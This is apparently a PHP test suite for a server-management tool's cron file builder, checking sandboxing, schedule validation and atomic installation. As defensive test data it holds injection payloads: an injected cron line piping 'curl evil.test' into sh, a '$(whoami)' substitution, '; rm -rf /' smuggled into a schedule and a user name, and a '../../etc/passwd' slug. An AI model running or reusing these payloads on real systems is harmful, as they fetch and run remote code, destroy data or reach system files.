<?php

declare(strict_types=1);

use App\Enums\ApplicationType;
use App\Exceptions\UnsafeNameException;
use App\Models\Application;
use App\Models\Server;
use App\Services\Deployment\AppShell;
use App\Services\Deployment\CrontabBuilder;
use App\Services\SSH\SSHConnection;
use Symfony\Component\Process\Process;
use Tests\Support\FakeSSHTransport;

const HOSTILE_CRON_COMMAND = "php artisan report --since='1 day' \"\$(whoami)\"\n# 100% done\necho \"50%\" 'it''s' # tail";

function scheduledApp(array $attributes = []): Application
{
    return Application::factory()->create(array_merge([
        'slug' => 'shop',
        'system_user' => 'coresmith-app-shop',
        'type' => ApplicationType::Php,
        'php_version' => '8.5.5',
        'cron_jobs' => [['schedule' => '* * * * *', 'command' => 'php artisan schedule:run']],
    ], $attributes));
}

function cronConnection(FakeSSHTransport $transport, string $user = 'root'): SSHConnection
{
    return (new SSHConnection(Server::factory()->create(['host_key_fingerprint' => null, 'ssh_user' => $user]), $transport))->connect();
}

function cronLine(string $schedule, int $index): string
{
    return $schedule . ' root systemd-run --quiet --wait --pipe --collect --service-type=exec --uid=coresmith-app-shop --gid=coresmith-app-shop'
        . " -p 'WorkingDirectory=/var/coresmith/apps/shop/current'"
        . " -p 'EnvironmentFile=/etc/coresmith/env/shop.env'"
        . ' -p KillMode=process -p UMask=0027 -p NoNewPrivileges=yes'
        . " -E 'PATH=/opt/asdf-data/installs/php/8.5.5/bin:/usr/local/bin:/usr/bin:/bin'"
        . " -- /bin/bash -s < '/etc/coresmith/cron/shop/{$index}.sh'";
}

function cronScript(string $command): string
{
    return "{\n{$command}\n} >> '/var/coresmith/apps/shop/shared/logs/scheduler.log' 2>&1\n";
}

function cronInstall(int $scripts = 1): string
{
    $staged = implode(' ', array_map(fn(int $index): string => "'/etc/coresmith/cron/.shop.new/{$index}.sh'", range(0, $scripts - 1)));

    return "chown root:root {$staged} && chmod 600 {$staged}"
        . " && chown root:root '/etc/cron.d/.coresmith-app-shop.new' && chmod 644 '/etc/cron.d/.coresmith-app-shop.new'"
        . " && rm -rf '/etc/coresmith/cron/shop' && mv -T '/etc/coresmith/cron/.shop.new' '/etc/coresmith/cron/shop'"
        . " && mv -f '/etc/cron.d/.coresmith-app-shop.new' '/etc/cron.d/coresmith-app-shop'"
        . " && if crontab -u 'coresmith-app-shop' -l >/dev/null 2>&1; then crontab -u 'coresmith-app-shop' -r; fi";
}

function cronStage(): string
{
    return "rm -rf '/etc/coresmith/cron/.shop.new' && mkdir -p '/etc/coresmith/cron/.shop.new'"
        . " && chown root:root '/etc/coresmith/cron' '/etc/coresmith/cron/.shop.new'"
        . " && chmod 700 '/etc/coresmith/cron' '/etc/coresmith/cron/.shop.new'";
}

function cronRemoval(): string
{
    return "rm -f '/etc/cron.d/coresmith-app-shop' '/etc/cron.d/.coresmith-app-shop.new'"
        . " && rm -rf '/etc/coresmith/cron/shop' '/etc/coresmith/cron/.shop.new'"
        . " && if crontab -u 'coresmith-app-shop' -l >/dev/null 2>&1; then crontab -u 'coresmith-app-shop' -r; fi";
}

test('an app cron entry runs as root, feeding its script to a shell that runs as the app user with its environment, path and sandbox', function () {
    expect(app(CrontabBuilder::class)->build(scheduledApp()))
        ->toBe("# Coresmith managed crons for shop - do not edit manually\n" . cronLine('* * * * *', 0) . "\n");
});

test('a cron run leaves the work it started in the background running when the command returns', function () {
    $file = app(CrontabBuilder::class)->build(scheduledApp(['cron_jobs' => [
        ['schedule' => '* * * * *', 'command' => 'php artisan schedule:run'],
        ['schedule' => '0 3 * * *', 'command' => 'php artisan backup:run'],
    ]]));
    $lines = array_slice(explode("\n", trim($file)), 1);

    expect($lines)->toHaveCount(2)
        ->and(collect($lines)->every(fn(string $line): bool => str_contains($line, ' -p KillMode=process ')))->toBeTrue();
});

test('a cron run shares the host /tmp, as cron always did, while a build keeps a private one', function () {
    $shell = app(AppShell::class);
    $application = scheduledApp();
    $line = explode("\n", app(CrontabBuilder::class)->build($application))[1];

    expect($line)->not->toContain('PrivateTmp')
        ->and($line)->toContain(' -p NoNewPrivileges=yes ')
        ->and($shell->run($application, 'true', '/tmp'))->toContain(' -p PrivateTmp=yes ')
        ->and($shell->runScript($application, '/etc/coresmith/blueprints/shop.sh', '/tmp'))->toContain(' -p PrivateTmp=yes ');
});

test('deploy steps still stop everything they started', function () {
    $shell = app(AppShell::class);
    $application = scheduledApp();

    expect($shell->run($application, 'true', '/tmp'))->not->toContain('KillMode')
        ->and($shell->runScript($application, '/etc/coresmith/blueprints/shop.sh', '/tmp'))->not->toContain('KillMode');
});

test('a rails cron run gets the production defaults the app units get, before the env file so the app can still override them', function () {
    $application = scheduledApp(['type' => ApplicationType::Ruby, 'framework' => 'rails', 'php_version' => null, 'ruby_version' => '3.3.6']);

    expect(app(CrontabBuilder::class)->build($application))->toBe(
        "# Coresmith managed crons for shop - do not edit manually\n"
        . '* * * * * root systemd-run --quiet --wait --pipe --collect --service-type=exec --uid=coresmith-app-shop --gid=coresmith-app-shop'
        . " -p 'WorkingDirectory=/var/coresmith/apps/shop/current'"
        . " -E 'RAILS_ENV=production' -E 'RACK_ENV=production'"
        . " -p 'EnvironmentFile=/etc/coresmith/env/shop.env'"
        . ' -p KillMode=process -p UMask=0027 -p NoNewPrivileges=yes'
        . " -E 'PATH=/opt/asdf-data/installs/ruby/3.3.6/bin:/usr/local/bin:/usr/bin:/bin'"
        . " -- /bin/bash -s < '/etc/coresmith/cron/shop/0.sh'\n",
    );
});

test('a php cron run gets no rails or rack defaults', function () {
    $file = app(CrontabBuilder::class)->build(scheduledApp());

    expect($file)->not->toContain('RAILS_ENV')
        ->and($file)->not->toContain('RACK_ENV');
});

test('a command a person typed never reaches the cron file, whatever it contains', function () {
    $file = app(CrontabBuilder::class)->build(scheduledApp(['cron_jobs' => [
        ['schedule' => '*/5 * * * *', 'command' => HOSTILE_CRON_COMMAND],
        ['schedule' => '0 3 * * 1-5', 'command' => "true\n* * * * * root curl evil.test | sh"],
    ]]));

    expect($file)->toBe("# Coresmith managed crons for shop - do not edit manually\n" . cronLine('*/5 * * * *', 0) . "\n" . cronLine('0 3 * * 1-5', 1) . "\n")
        ->and($file)->not->toContain('%')
        ->and($file)->not->toContain('whoami')
        ->and($file)->not->toContain('artisan')
        ->and($file)->not->toContain('evil.test');
});

test('each command lives in its own script, inside the redirection that sends all of it to the scheduler log', function () {
    expect(app(CrontabBuilder::class)->scripts(scheduledApp(['cron_jobs' => [
        ['schedule' => '*/5 * * * *', 'command' => HOSTILE_CRON_COMMAND],
        ['schedule' => '* * * * *', 'command' => 'php artisan schedule:run'],
    ]])))->toBe([
        '/etc/coresmith/cron/shop/0.sh' => cronScript(HOSTILE_CRON_COMMAND),
        '/etc/coresmith/cron/shop/1.sh' => cronScript('php artisan schedule:run'),
    ]);
});

test('the generated cron line and script are valid bash', function (array $attributes) {
    $application = scheduledApp([...$attributes, 'cron_jobs' => [['schedule' => '*/5 * * * *', 'command' => HOSTILE_CRON_COMMAND]]]);
    $line = explode("\n", app(CrontabBuilder::class)->build($application))[1];
    $script = tempnam(sys_get_temp_dir(), 'coresmith-cron-');
    file_put_contents($script, app(CrontabBuilder::class)->scripts($application)['/etc/coresmith/cron/shop/0.sh']);

    $cron = new Process(['bash', '-n', '-c', (string) preg_replace('/^(?:\S+ ){5}root /', '', $line)]);
    $cron->run();
    $shell = new Process(['bash', '-n', $script]);
    $shell->run();

    unlink($script);

    expect($line)->toStartWith('*/5 * * * * root systemd-run ')
        ->and($cron->getExitCode())->toBe(0, $cron->getErrorOutput())
        ->and($shell->getExitCode())->toBe(0, $shell->getErrorOutput());
})->with([
    'php' => [[]],
    'rails' => [['type' => ApplicationType::Ruby, 'framework' => 'rails', 'php_version' => null, 'ruby_version' => '3.3.6']],
]);

test('a multi-line command sends every line of its output to the log, which the shell running it creates', function () {
    $log = sys_get_temp_dir() . '/coresmith-cron-' . bin2hex(random_bytes(4)) . '.log';
    $script = app(CrontabBuilder::class)->scripts(scheduledApp(['cron_jobs' => [['schedule' => '* * * * *', 'command' => "echo first\necho second >&2\necho 100%"]]]))['/etc/coresmith/cron/shop/0.sh'];

    $run = new Process(['bash', '-s'], null, null, str_replace("'/var/coresmith/apps/shop/shared/logs/scheduler.log'", escapeshellarg($log), $script));
    $run->run();

    $written = (string) @file_get_contents($log);
    @unlink($log);

    expect($run->getExitCode())->toBe(0, $run->getErrorOutput())
        ->and($run->getOutput())->toBe('')
        ->and($run->getErrorOutput())->toBe('')
        ->and($written)->toBe("first\nsecond\n100%\n");
});

test('a schedule cron could misread is refused when it is saved', function (string $schedule) {
    expect(fn() => scheduledApp(['cron_jobs' => [['schedule' => $schedule, 'command' => 'php artisan schedule:run']]]))
        ->toThrow(UnsafeNameException::class, 'Write five fields separated by single spaces');
})->with('unsafe cron schedules');

test('a schedule cron could misread is refused when the cron file is built', function (string $schedule) {
    $application = Application::factory()->make(['slug' => 'shop', 'system_user' => 'coresmith-app-shop', 'cron_jobs' => [['schedule' => $schedule, 'command' => 'true']]]);

    expect(fn() => app(CrontabBuilder::class)->build($application))->toThrow(UnsafeNameException::class, 'is not a valid cron schedule');
})->with('unsafe cron schedules');

dataset('unsafe cron schedules', [
    'a newline' => "* * * * *\n* * * * *",
    'a trailing newline' => "* * * * *\n",
    'a tab' => "*\t* * * *",
    'a percent sign' => '* * * * *%',
    'a sixth field' => '* * * * * 5',
    'four fields' => '* * * *',
    'two spaces between fields' => '*  * * * *',
    'a leading space' => ' * * * * *',
    'a command' => '* * * * *; rm -rf /',
    'a minute cron has no' => '61 * * * *',
    'a backwards range' => '5-1 * * * *',
    'a zero step' => '*/0 * * * *',
    'a step with no range' => '5/10 * * * *',
]);

test('the schedule tells the person what to write instead, with what they wrote shown safely', function () {
    expect(fn() => CrontabBuilder::assertSchedule("*\t* * * *\n"))
        ->toThrow(UnsafeNameException::class, '[*\t* * * *\n] is not a valid cron schedule. Write five fields separated by single spaces, using only digits and * / , - in each, such as */5 * * * *.');
});

test('five plain fields are accepted', function (string $schedule) {
    expect(CrontabBuilder::assertSchedule($schedule))->toBe($schedule)
        ->and(scheduledApp(['cron_jobs' => [['schedule' => $schedule, 'command' => 'true']]])->exists)->toBeTrue();
})->with(['* * * * *', '*/5 * * * *', '0 3 * * 1-5', '0,30 9-17 1 1,6 0']);

test('the scripts folder is rebuilt beside the live one and swapped in with the cron file, so a removed entry leaves no script', function () {
    $application = scheduledApp(['cron_jobs' => [
        ['schedule' => '* * * * *', 'command' => 'php artisan schedule:run'],
        ['schedule' => '0 3 * * *', 'command' => 'php artisan backup:run'],
    ]]);
    $transport = new FakeSSHTransport;

    app(CrontabBuilder::class)->write(cronConnection($transport), $application);

    expect($transport->uploads())->toBe([
        '/etc/coresmith/cron/.shop.new/0.sh' => cronScript('php artisan schedule:run'),
        '/etc/coresmith/cron/.shop.new/1.sh' => cronScript('php artisan backup:run'),
        '/etc/cron.d/.coresmith-app-shop.new' => app(CrontabBuilder::class)->build($application),
    ])
        ->and($transport->commands())->toBe([cronStage(), cronInstall(2)]);
});

test('the cron file is root owned and readable by cron, the scripts are root only, and the old user crontab goes so nothing runs twice', function () {
    $transport = new FakeSSHTransport;

    app(CrontabBuilder::class)->write(cronConnection($transport), scheduledApp());

    expect($transport->commands())->toBe([cronStage(), cronInstall()]);
});

test('cron reads the file by its name but ignores it while it is being written', function () {
    $path = app(CrontabBuilder::class)->path(scheduledApp());

    expect($path)->toBe('/etc/cron.d/coresmith-app-shop')
        ->and(preg_match('/^[A-Za-z0-9_-]+$/', basename($path)))->toBe(1)
        ->and(preg_match('/^[A-Za-z0-9_-]+$/', '.coresmith-app-shop.new'))->toBe(0);
});

test('a sudo user writes the cron file and scripts through staged uploads and sudo', function () {
    $transport = new FakeSSHTransport;

    app(CrontabBuilder::class)->write(cronConnection($transport, 'deploy'), scheduledApp());

    $privileged = collect($transport->commands())->reject(fn(string $command): bool => str_starts_with($command, 'mktemp ') || str_starts_with($command, "rm -f '/tmp/coresmith-upload."));

    expect(array_keys($transport->uploads()))->toBe([FakeSSHTransport::STAGED_UPLOAD])
        ->and($privileged->every(fn(string $command): bool => str_starts_with($command, 'sudo ')))->toBeTrue()
        ->and($privileged->first())->toBe('sudo bash -c ' . escapeshellarg(cronStage()))
        ->and($privileged->implode("\n"))->toContain('/etc/coresmith/cron/.shop.new/0.sh')
        ->and($privileged->last())->toBe('sudo bash -c ' . escapeshellarg(cronInstall()));
});

test('an app with no cron jobs has its cron file, its scripts and any old user crontab removed', function () {
    $transport = new FakeSSHTransport;

    app(CrontabBuilder::class)->write(cronConnection($transport), scheduledApp(['cron_jobs' => null]));

    expect($transport->uploads())->toBe([])
        ->and($transport->commands())->toBe([cronRemoval()]);
});

test('an entry with no command is left out rather than written as an empty script', function () {
    $application = scheduledApp(['cron_jobs' => [['schedule' => '* * * * *', 'command' => '  '], ['schedule' => '0 3 * * *', 'command' => 'php artisan backup:run']]]);

    expect(app(CrontabBuilder::class)->scripts($application))->toBe(['/etc/coresmith/cron/shop/0.sh' => cronScript('php artisan backup:run')])
        ->and(app(CrontabBuilder::class)->build($application))->toBe("# Coresmith managed crons for shop - do not edit manually\n" . cronLine('0 3 * * *', 0) . "\n");
});

test('removing an app cron file names the file and user through their checks', function (array $attributes, string $message) {
    $transport = new FakeSSHTransport;

    expect(fn() => app(CrontabBuilder::class)->remove(cronConnection($transport), Application::factory()->make($attributes)))
        ->toThrow(UnsafeNameException::class, $message);

    expect($transport->commands())->toBe([]);
})->with([
    'a slug that walks out of cron.d' => [['slug' => '../../etc/passwd', 'system_user' => 'coresmith-app-shop'], 'is not a valid application slug'],
    'a user that is a shell command' => [['slug' => 'shop', 'system_user' => 'x; rm -rf /'], 'is not a valid system user name'],
]);
